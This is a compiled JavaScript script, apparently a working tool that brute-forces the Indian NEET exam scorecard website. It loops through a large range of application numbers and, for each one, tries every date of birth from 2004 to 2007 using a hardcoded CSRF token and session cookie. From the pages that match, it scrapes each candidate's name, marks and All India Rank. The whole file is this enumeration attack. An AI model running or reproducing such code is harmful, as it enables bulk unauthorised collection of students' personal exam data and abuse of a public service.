"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const cheerio_1 = __importDefault(require("cheerio"));
const qs_1 = __importDefault(require("qs"));
function solve(applicationNumber, day, month, year) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = qs_1.default.stringify({
            "_csrf-frontend": "g8TKbSEh6Fmwr1FAZGjYNZYT8UwPfS4Oiwypw1CIKSrxsYQ6E07ZPPvgI3gILqgE7nqkH1hQbGTzVMHyIsRLZA==",
            "Scorecardmodel[ApplicationNumber]": applicationNumber,
            "Scorecardmodel[Day]": day,
            "Scorecardmodel[Month]": month,
            "Scorecardmodel[Year]": year,
        });
        let config = {
            method: "post",
            maxBodyLength: Infinity,
            url: "https://neet.ntaonline.in/frontend/web/scorecard/index",
            headers: {
                Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Cache-Control": "max-age=0",
                Connection: "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
                Cookie: "advanced-frontend=7q361cgrk37dr4skskg2fhrk1j; _csrf-frontend=ec741b214464402d5ec8a033d81a81d92ac733e6807ecc0c62f2268edc877f75a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22ruNW2o1eKOr8lFp1xiUSW-BjxXh1rLbN%22%3B%7D",
                Origin: "null",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "Sec-GPC": "1",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua": '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
            },
            data: data,
        };
        try {
            const response = yield axios_1.default.request(config);
            const parseData = ParserHTML(JSON.stringify(response.data));
            return parseData;
        }
        catch (error) {
            console.log("exception");
        }
    });
}
function ParserHTML(htmlContent) {
    const $ = cheerio_1.default.load(htmlContent);
    const applicationNumber = $('td:contains("Application No.")').next("td").text().trim() || "N/A";
    const candidatesName = $('td:contains("Candidate’s Name")').next("td").text().trim() || "N/A";
    const AllIndiaRank = $('td:contains("NEET All India Rank")').next("td").text().trim() || "N/A";
    const Marks = $('td:contains("Total Marks Obtained (out of 720)")')
        .next("td")
        .text()
        .trim() || "N/A";
    if (AllIndiaRank === "N/A")
        return null;
    return {
        applicationNumber,
        candidatesName,
        Marks,
        AllIndiaRank,
    };
}
function main(rollNo) {
    return __awaiter(this, void 0, void 0, function* () {
        let solved = false;
        for (let year = 2007; year >= 2004; year--) {
            if (solved) {
                break;
            }
            for (let month = 1; month <= 12; month++) {
                if (solved) {
                    break;
                }
                const dataPromises = [];
                console.log(`Sending request for the month of ${month} of the year ${year}`);
                for (let day = 1; day <= 31; day++) {
                    const DataPromises = solve(rollNo, day.toString(), month.toString(), year.toString());
                    dataPromises.push(DataPromises);
                }
                const resolvedData = yield Promise.all(dataPromises);
                resolvedData.forEach((data) => {
                    if (data) {
                        console.log(data);
                        solved = true;
                    }
                });
            }
        }
    });
}
function solveAllApplication() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 240411111111; i < 240411199999; i++) {
            yield main(i.toString());
        }
    });
}
solveAllApplication();
